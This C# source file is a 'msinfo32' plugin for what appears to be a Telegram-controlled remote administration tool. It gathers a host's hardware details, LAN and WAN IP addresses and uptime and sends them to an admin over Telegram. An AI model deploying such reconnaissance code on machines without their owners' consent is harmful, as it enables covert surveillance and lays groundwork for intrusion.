using msinfo32.Components;
using Sdk.Base;
using Sdk.Contracts;
using Sdk.Dependencies;
using Sdk.Models;
using Sdk.Telegram;
using System.Text;

namespace msinfo32
{
    public class DllMain : Plugin
    {
        private IPCAssistant _telegram;
        private IEnumerable<IComponent> _components;

        public DllMain()
        {
            base.Name = "/msinfo32";
            base.Description = "Print workstation information.";
        }

        public override void Dispatch()
        {
            var sb = new StringBuilder();

            foreach (IComponent _component in this._components)
            {
                sb.AppendLine(_component.GetInformation());
            }

            this._telegram.SendTextBackToAdmin(sb.ToString());
        }

        public override void Dispatch(ExecuteResult data)
        {
            throw new NotImplementedException();
        }

        public override void Initialize(IServiceLocator service)
        {
            this._telegram = service.ResolveInstance<IPCAssistant>();
            var cpuidHelper = service.ResolveInstance<ICpuidHelper>();

            var _devices = cpuidHelper.GetProcessors()
                   .Concat(cpuidHelper.GetDisplayAdapters())
                   .Concat(cpuidHelper.GetMainboards())
                   .Concat(cpuidHelper.GetDrives());

            this._components = new IComponent[]
            {
                new SYSTEM_INFO(_devices),
                new LAN_IPv4(),
                new WAN_IPv4(),
                new UP_TIME()
            };
        }
    }
}
